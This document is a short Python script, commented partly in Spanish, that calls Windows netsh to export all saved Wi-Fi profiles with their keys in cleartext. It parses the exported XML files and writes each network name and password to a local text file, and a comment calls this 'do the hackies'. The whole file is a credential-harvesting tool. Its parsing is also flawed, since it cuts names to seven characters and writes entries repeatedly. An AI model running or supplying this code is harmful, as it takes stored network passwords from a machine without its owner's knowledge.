import subprocess
import os
import sys

#Create a File
password_file = open('password', "w")
password_file.write("Hello sir! Here are your password:\n\n ")
password_file.close()

#list
wifi_files = []
wifi_name = []
wifi_password = []

#ejecucion de comando de windows
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output= True).stdout.decode()

#Establece el path
path = os.getcwd()

#do the hackies

for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:7]
                        wifi_name.append(back)
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x, y in zip(wifi_name, wifi_password):
                            sys.stdout = open("password.txt","a")
                            print('SSID: '  + x, 'Password: ' + y, sep = '\n')
                            sys.stdout.close()                          
                        


